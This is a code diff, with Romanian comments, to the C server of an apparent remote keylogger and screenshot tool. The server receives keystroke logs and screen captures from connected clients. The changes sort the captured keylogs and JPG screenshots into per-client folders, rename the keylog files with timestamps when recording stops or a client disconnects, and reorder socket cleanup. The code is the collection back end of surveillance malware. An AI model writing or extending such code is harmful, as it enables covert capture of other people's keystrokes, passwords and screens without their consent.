@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <stdio.h>
+#include <sys/stat.h>
 #include <stdlib.h>
 #include <fcntl.h>
 #include <time.h>
@@ -22,7 +23,18 @@ void handleOpcode(message_t msg, int clientSock)
     case 'K':
         if (strcmp(msg.buffer, "STOP") == 0)
         {
+            // Redenumire fisier
+            snprintf(filename, BUFFER_SIZE, "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
             close(clientHndler.clientsAttr[clientSock].keylogger_fd);
+            char newFn[BUFFER_SIZE];
+            time_t now = time(NULL);
+            struct tm *t = localtime(&now);
+            char timestamp[64];
+            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
+
+            snprintf(newFn, BUFFER_SIZE, "%s/%s_%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name, timestamp);
+            rename(filename, newFn);
+
             clientHndler.clientsAttr[clientSock].keylogger_fd = -1;
             clientHndler.clientsAttr[clientSock].recordKeys = 0;
         }
@@ -49,7 +61,9 @@ void handleOpcode(message_t msg, int clientSock)
             p = strtok(NULL, "= \n");
         }
 
-        snprintf(filename, sizeof(filename), "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
+        snprintf(filename, sizeof(filename), "%s/keylog%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name);
+
+        mkdir(clientHndler.clientsAttr[clientSock].name, 0755);
 
         clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
         if (clientHndler.clientsAttr[clientSock].keylogger_fd == -1)
@@ -64,7 +78,7 @@ void handleOpcode(message_t msg, int clientSock)
         char timestamp[64];
         strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
 
-        snprintf(filename, BUFFER_SIZE * 2, "%s_%s.jpg", clientHndler.clientsAttr[clientSock].name, timestamp);
+        snprintf(filename, BUFFER_SIZE * 2, "%s/%s_%s.jpg", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name, timestamp);
         recvFile(clientSock, filename);
         break;
     default:
@@ -90,13 +104,26 @@ void *handle_client(void *params)
         handleOpcode(client_message, args->client_sock);
     }
 
+    char filename[BUFFER_SIZE];
+    if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1)
+    {
+        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt", clientHndler.clientsAttr[args->client_sock].name, clientHndler.clientsAttr[args->client_sock].name);
+        close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
+        char newFn[BUFFER_SIZE];
+        time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+        char timestamp[64];
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
+
+        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt", clientHndler.clientsAttr[args->client_sock].name, clientHndler.clientsAttr[args->client_sock].name, timestamp);
+        rename(filename, newFn);
+    }
+
     if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1)
     {
         close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
         clientHndler.clientsAttr[args->client_sock].keylogger_fd = -1;
     }
-    close(args->client_sock);
-
     for (int i = 0; i < clientHndler.numberClients; i++)
     {
         if (clientHndler.socketsClients[i] == args->client_sock)
@@ -109,8 +136,9 @@ void *handle_client(void *params)
             break;
         }
     }
-
+    close(args->client_sock);
     free(params);
+
     return NULL;
 }
 
